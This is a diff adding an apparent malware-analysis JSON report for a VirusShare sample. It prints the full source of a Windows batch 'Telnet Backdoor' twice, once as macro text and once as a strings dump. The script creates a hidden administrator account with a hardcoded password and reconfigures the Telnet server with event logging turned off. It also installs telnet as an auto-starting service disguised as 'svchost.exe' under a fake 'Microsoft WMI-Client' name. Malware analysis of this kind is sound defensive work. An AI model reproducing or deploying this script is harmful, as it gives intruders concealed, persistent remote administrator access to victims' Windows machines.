@@ -1,0 +1,73 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "\n:: Telnet Backdoor for WindowsXP Ver 1.4 FiNAL WindowsXP-Prof\n:: (C) heroin_AT_mol.mn http://protoculture.tk \n\n :: ADD USER WiTH SUFFiCiENT RiGHTS!\n\nnet localgroup TelnetClients /add\nnet user iwam_user mypass /add\nnet localgroup Administratoren iwam_user /add\nnet localgroup TelnetClients iwam_user /add\n\n :: SET REGiSTRY!\n\ncd %windir%\\system32\nECHO Windows Registry Editor Version 5.00>0.reg\nECHO [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\1.0]>>0.reg\nECHO \"LoginScript\"=hex(2):63,00,6d,00,64,00,00,00>>0.reg\nECHO \"TelnetPort\"=dword:000003ff>>0.reg\nECHO \"MaxConnections\"=dword:0000000a>>0.reg\nECHO \"EventLoggingEnabled\"=dword:00000000>>0.reg\nECHO \"DisconnectKillAllApps\"=dword:00000000>>0.reg\nECHO [-HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\1.0\\ReadConfig]>>0.reg\nECHO [-HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\Defaults]>>0.reg\nregedit /s 0.reg && DEL 0.reg\n\n :: SET SERViCE!\n\nCOPY %windir%\\system32\\tlntsvr.exe %windir%\\system32\\\"svchost.exe\ufffd\"\nassoc .exe\ufffd=exefile\nsc create \"WMI-Client\" binpath= \"%windir%\\system32\\svchost.exe\ufffd\" start= auto\n\"svchost.exe\ufffd\" /service\nsc description WMI-Client \"Microsoft WMI-Client\"\nsc start WMI-Client"
+    },
+    "filename": "VirusShare_29b0079ec75ff2b265d55f87d5eb7fb6",
+    "filesize": 1200,
+    "filetype": "ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "29b0079ec75ff2b265d55f87d5eb7fb6",
+        "sha1": "07c2619d0ce738fe75d19b9424a64428488aceae",
+        "sha256": "445b27db38c8000d62b2544375d3603233bed8c8e550f27eaf1dae8495c9fd8d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            ":: Telnet Backdoor for WindowsXP Ver 1.4 FiNAL WindowsXP-Prof",
+            ":: (C) heroin_AT_mol.mn http://protoculture.tk ",
+            " :: ADD USER WiTH SUFFiCiENT RiGHTS!",
+            "net localgroup TelnetClients /add",
+            "net user iwam_user mypass /add",
+            "net localgroup Administratoren iwam_user /add",
+            "net localgroup TelnetClients iwam_user /add",
+            " :: SET REGiSTRY!",
+            "cd %windir%\\system32",
+            "ECHO Windows Registry Editor Version 5.00>0.reg",
+            "ECHO [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\1.0]>>0.reg",
+            "ECHO \"LoginScript\"=hex(2):63,00,6d,00,64,00,00,00>>0.reg",
+            "ECHO \"TelnetPort\"=dword:000003ff>>0.reg",
+            "ECHO \"MaxConnections\"=dword:0000000a>>0.reg",
+            "ECHO \"EventLoggingEnabled\"=dword:00000000>>0.reg",
+            "ECHO \"DisconnectKillAllApps\"=dword:00000000>>0.reg",
+            "ECHO [-HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\1.0\\ReadConfig]>>0.reg",
+            "ECHO [-HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\Defaults]>>0.reg",
+            "regedit /s 0.reg && DEL 0.reg",
+            " :: SET SERViCE!",
+            "COPY %windir%\\system32\\tlntsvr.exe %windir%\\system32\\\"svchost.exe\"",
+            "assoc .exe=exefile",
+            "sc create \"WMI-Client\" binpath= \"%windir%\\system32\\svchost.exe\" start= auto",
+            "\"svchost.exe\" /service",
+            "sc description WMI-Client \"Microsoft WMI-Client\"",
+            "sc start WMI-Client"
+        ],
+        "file": {
+            "ECHO \"DisconnectKillAllApps\"=dword:00000000>>0.reg": "Registry",
+            "ECHO \"EventLoggingEnabled\"=dword:00000000>>0.reg": "Registry",
+            "ECHO \"LoginScript\"=hex(2):63,00,6d,00,64,00,00,00>>0.reg": "Registry",
+            "ECHO \"MaxConnections\"=dword:0000000a>>0.reg": "Registry",
+            "ECHO \"TelnetPort\"=dword:000003ff>>0.reg": "Registry",
+            "ECHO Windows Registry Editor Version 5.00>0.reg": "Registry",
+            "ECHO [-HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\1.0\\ReadConfig]>>0.reg": "Registry",
+            "ECHO [-HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\Defaults]>>0.reg": "Registry",
+            "ECHO [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\1.0]>>0.reg": "Registry",
+            "regedit /s 0.reg && DEL 0.reg": "Registry"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://protoculture.tk"
+        ]
+    },
+    "time": "0:00:00.422546",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
